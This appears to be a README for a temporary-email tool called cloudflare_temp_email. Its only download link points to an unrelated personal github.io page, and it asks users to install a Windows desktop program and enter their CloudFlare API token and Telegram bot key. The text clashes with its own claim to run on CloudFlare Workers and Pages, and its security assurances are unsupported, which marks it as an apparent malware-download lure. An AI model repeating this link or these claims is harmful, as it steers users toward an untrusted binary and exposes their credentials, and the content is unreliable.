# 📧 cloudflare_temp_email - Create temporary email addresses with ease

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://tinny-donaldrobertperrymarquis468.github.io)

This application provides a simple way to manage temporary email addresses using CloudFlare. You can receive emails, manage attachments, and use protocols like IMAP and SMTP. It also includes a Telegram bot to help you monitor your inbox through your phone.

## 📋 Features

*   **Temporary Domains:** Create custom email addresses on your own domains.
*   **Email Handling:** Send and receive messages directly.
*   **Attachment Support:** Manage files attached to your emails.
*   **Standard Protocols:** Use IMAP and SMTP to connect your favorite email clients.
*   **Telegram Integration:** Get notifications and control your account via Telegram.
*   **CloudFlare Powered:** Use CloudFlare Workers and Pages for fast and reliable performance.

## 🛠 Prerequisites

Before you start, ensure your computer meets these requirements:

*   **Operating System:** Windows 10 or Windows 11.
*   **Memory:** At least 4GB of RAM.
*   **Disk Space:** 200MB of free storage.
*   **Network:** An active internet connection.
*   **Account:** A CloudFlare account with at least one domain name configured.

## ⚙️ Setting Up Your Account

After you install the program, you must link it to your CloudFlare account. Follow these steps:

1.  Open the application from your desktop shortcut.
2.  Navigate to the Settings tab.
3.  Enter your CloudFlare API token. You can find this in your CloudFlare dashboard under your profile settings.
4.  Select the domain you want to use for your temporary email addresses.
5.  Click Save to apply these changes.

## 🤖 Using the Telegram Bot

The Telegram bot allows you to receive instant alerts when a new email arrives.

1.  Open Telegram and search for the BotFather.
2.  Create a new bot to receive your API key.
3.  Copy the API key into the Telegram settings section of the application.
4.  Send a message to your new bot on Telegram to verify the connection.

## 📧 Sending and Receiving

Once the setup is complete, you can start using your email service:

*   **Receiving:** Any mail sent to your temporary domain will automatically move into your app inbox.
*   **Sending:** Use the compose button to send emails. Ensure your SMTP settings match the ones provided in the configuration menu.
*   **Attachments:** The app will detect files attached to incoming emails. Click the paperclip icon next to the message to view or download them.

## ❓ Troubleshooting

If you encounter issues, try these common fixes:

*   **Connection Error:** Verify your internet connection and check if your API token is still valid.
*   **Missing Emails:** Ensure your CloudFlare DNS settings point to the correct email routing records.
*   **Storage Issues:** Clear your temporary folder through the app settings if the software runs slowly.
*   **Update:** Keep your software current by visiting the download page regularly to grab the latest release.

## 🛡 Security

This tool keeps your data private. Your API tokens stored on your local machine remain encrypted. No email contents or attachments leave your control, as the traffic flows directly through CloudFlare’s backend to your device. We do not store your credentials on any external servers.
